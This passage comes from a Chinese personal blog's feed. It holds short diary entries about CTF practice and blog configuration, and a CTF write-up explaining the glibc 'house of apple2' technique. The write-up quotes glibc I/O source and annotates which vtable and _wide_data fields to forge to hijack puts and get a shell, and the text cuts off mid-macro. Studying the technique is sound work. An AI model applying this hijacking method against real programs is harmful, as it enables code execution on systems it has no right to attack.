&lt;p&gt;换了个生成器，可以限定某个页面只显示特定ta</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-11</title>
    <link href="https://c-lby.top/2024/08/11/diary/24-8-11/"/>
    <id>https://c-lby.top/2024/08/11/diary/24-8-11/</id>
    <published>2024-08-11T09:36:44.000Z</published>
    <updated>2024-08-12T09:43:34.461Z</updated>
    
    <content type="html"><![CDATA[<p>把moe的密码和misc也做了，ak了第一周密码。misc依然是脑洞不是很够。</p><p>开始捣鼓diary页面了。在写时尚小垃圾的时候发现，归档页面的title是中文，而其他页面title是英文，强迫症受不了，于是翻了一下几个ejs，改了改其他页面引用title的方式是从语言yml文件里来的就行了。</p><p>好像归档的界面就是最理想的对于日记排版的界面，有年月日和标题，打算就用这个了，改改里面储存文档的路径就好了，希望今晚能搞定。（21:31）</p><p>看来是搞不定，官方文档已经是新版本的变量了，旧版本只能靠自己摸索摸索了。现在要想办法在diary界面过滤tag，使得显示出来的文章只有diary的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;把moe的密码和misc也做了，ak了第一周密码。misc依然是脑洞不是很够。&lt;/p&gt;
&lt;p&gt;开始捣鼓diary页面了。在写时尚小垃圾的时候发现，归档页面的title是中文，而其他页面title是英文，强迫症受不了，于是翻了一下几个ejs，改了改其他页面引用title的方式是从语言yml文件里来的就行了。&lt;/p&gt;
&lt;p&gt;好像归档的界面就是最理想的对于日记排版的界面，有年月日和标题，打算就用这个了，改改里面储存文档的路径就好了，希望今晚能搞定。（21:31）&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-10</title>
    <link href="https://c-lby.top/2024/08/10/diary/24-8-10/"/>
    <id>https://c-lby.top/2024/08/10/diary/24-8-10/</id>
    <published>2024-08-10T09:12:37.000Z</published>
    <updated>2024-08-14T16:15:58.050Z</updated>
    
    <content type="html"><![CDATA[<p>前几天受到某个大佬的启发，想要在博客里加个日记的页面，每天记录一点当日搞的小玩意或者学到的东西，这样无论是记录当天学习内容还是为了第二天衔接没做完当天没做完的工作，都很方便。</p><p>事不宜迟，那么今天就开始升级博客了。首先是加装了页面加密和隐藏的插件，<a href="https://blog.yxyang.top/posts/24498.html">资料</a>。想在menu上加一个diary的页面，但是还没想好该怎么呈现内容，估计还得手搓一下ejs，所以页面这一块暂且搁置了。</p><p>把2024moectf的pwn第一周的题目做完了，题目依然是很有moe的味道，但是没有那么传统了，不如说新颖得有点不适应，虽然很简单，但是最后一题的引导性没那么好。misc的引导性就比较强。当然也有可能是我比较菜。</p><p>wsrx桌面版太麻烦，用习惯了linux，所以直接装了命令行的版本。这玩意是用rust写的，要求版本在1.77以上，所以还得rustup升级，结果下载安装好几遍都更换版本不成功，索性删掉重新安装。<a href="https://www.sysgeek.cn/ubuntu-install-rust/#google_vignette">资料</a>。到最后发现最重要的是要激活环境这一步source $HOME&#x2F;.cargo&#x2F;env，然而其他资料都没有写到。顺带一提，旧版本的rustup没有自删除的功能……用上命令行版本的wsrx就顺手多了，虽然还是很想吐槽，这四个字母在键盘上真的不好打……</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前几天受到某个大佬的启发，想要在博客里加个日记的页面，每天记录一点当日搞的小玩意或者学到的东西，这样无论是记录当天学习内容还是为了第二天衔接没做完当天没做完的工作，都很方便。&lt;/p&gt;
&lt;p&gt;事不宜迟，那么今天就开始升级博客了。首先是加装了页面加密和隐藏的插件，&lt;a href=&quot;https://blog.yxyang.top/posts/24498.html&quot;&gt;资料&lt;/a&gt;。想在menu上加一个diary的页面，但是还没想好该怎么呈现内容，估计还得手搓一下ejs，所以页面这一块暂且搁置了。&lt;/p&gt;
&lt;p&gt;把2024moectf的pwn第一周的题目做完了，题目依然是很有moe的味道，但是没有那么传统了，不如说新颖得有点不适应，虽然很简单，但是最后一题的引导性没那么好。misc的引导性就比较强。当然也有可能是我比较菜。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>『Heap Exploitation』对house of apple2的理解与分析</title>
    <link href="https://c-lby.top/2024/08/05/house-of-apple2/"/>
    <id>https://c-lby.top/2024/08/05/house-of-apple2/</id>
    <published>2024-08-05T02:46:29.000Z</published>
    <updated>2024-08-09T16:10:35.818Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>之前傻乎乎的在网上找资料学习的时候学得一头雾水，最近才忽然想到为什么不去<a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2">roderick师傅的博客</a>直接看本人的分析呢。然后发现roderick师傅写的是最详细最易懂的，推荐正在学习apple2的师傅直接去看。</p><p>我这里据两道题来分析，记录一下学习的过程。</p><h3 id="0x01-『DeadSec-CTF-2024』shadow"><a href="#0x01-『DeadSec-CTF-2024』shadow" class="headerlink" title="0x01 『DeadSec CTF 2024』shadow"></a>0x01 『DeadSec CTF 2024』shadow</h3><p>略过泄露堆地址和libc地址的过程，详情看<a href="https://c-lby.top/2024/07/30/2024-deadsec-wp/">这篇文章</a>。这里直接关注利用house of apple2来getshell的部分。</p><h4 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h4><p>apple系列手法主要是劫持FILE结构中的<code>_wide_data</code>成员中的<code>_wide_vtable</code>中的某个函数指针为ogg或者system。要劫持哪个函数取决于选择的调用链。如果忘记或者不清楚的，建议先看原博客文章，再来看这里的具体分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>menu显示用的是puts函数（也可能是printf打印了出字符串加换行结尾，这种情况编译器也会将printf优化成puts函数），我们考虑劫持puts函数的输出流来打apple2。</p><h5 id="puts函数正常执行流程"><a href="#puts函数正常执行流程" class="headerlink" title="puts函数正常执行流程"></a>puts函数正常执行流程</h5><p>我们先关注一下puts函数正常执行流程是怎么样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure><p>puts函数会通过宏调用到<code>_IO_XSPUTN</code>函数，随后又会通过根据偏移在vtable跳转到对应函数去执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);    &lt;--原本要解析的</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);  &lt;--我们想要解析的（准确来说是wide_vtable对应的那个seekoff，往下阅读）</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果按照roderick师傅给出的三个调用链，那么我们需要让puts函数调用到<code>__overflow</code>或者<code>__doallocate</code>两个位置上。这里我选用了另一条调用链，需要从<code>__seekoff</code>作为入口。</p><h5 id="劫持vtable指针"><a href="#劫持vtable指针" class="headerlink" title="劫持vtable指针"></a>劫持vtable指针</h5><p>正常执行puts函数的话肯定不会达到<code>__seekoff</code>，所以我们要修改vtable指针为正常虚表地址加上0x10的偏移，让puts函数从xsputn解析到seekoff。因为只是加个偏移，虚表依然位于libc的虚表段中，不会触发检查报错。当然，这里虚表需要我们写入的是<code>_IO_wfile_jumps+0x10</code>，因为要调用到<code>_wide_data</code>成员相关的函数。这里是我们要修改的第一个地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span>   &lt;---要改成_IO_wfile_jumps+<span class="number">0x10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="劫持-wide-data"><a href="#劫持-wide-data" class="headerlink" title="劫持_wide_data"></a>劫持_wide_data</h5><p>下面是第二个要修改的地方，file结构体中的<code>_wide_data</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span>   &lt;---要修改的指针</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们需要将他修改为一个可控的地址，用来伪造虚表。我们来看一下这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现他和<code>_IO_FILE</code>结构体很像，其实作用几乎是相同的。我们来看为什么我们需要劫持这个成员，首先来看<code>_IO_wfile_jumps</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据前面分析，我们会执行<code>_IO_wfile_seekoff</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    </span><br><span class="line">...(这个函数很长很长)</span><br></pre></td></tr></table></figure><p>fp指向当前FILE（例如puts函数对应stdout）。显然这个函数的条件判断等等都用的是指向wide_data中的成员来操作，所以我们需要将<code>_wide_data</code>指向一个可控地址来伪造条件才能进入我们想要进入的调用链。</p><h5 id="伪造条件进入调用链"><a href="#伪造条件进入调用链" class="headerlink" title="伪造条件进入调用链"></a>伪造条件进入调用链</h5><p>我们需要从seekoff函数进入到<code>_IO_switch_to_wget_mode</code>中，从上面的代码不难看出，我们想执行到这个函数，首先需要满足<code>was_writing</code>为真，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>。这就需要在<code>_wide_data</code>对应的可控地址中进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span>      &lt;--改小</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span>    &lt;--改大</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span>  &lt;--下面还会修改这个指针为可控地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来关注<code>_IO_switch_to_wget_mode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时，会执行到<code>_IO_WOVERFLOW</code>函数，刚刚已经构造好了，所以不用再修改其他东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">       + offsetof(TYPE, 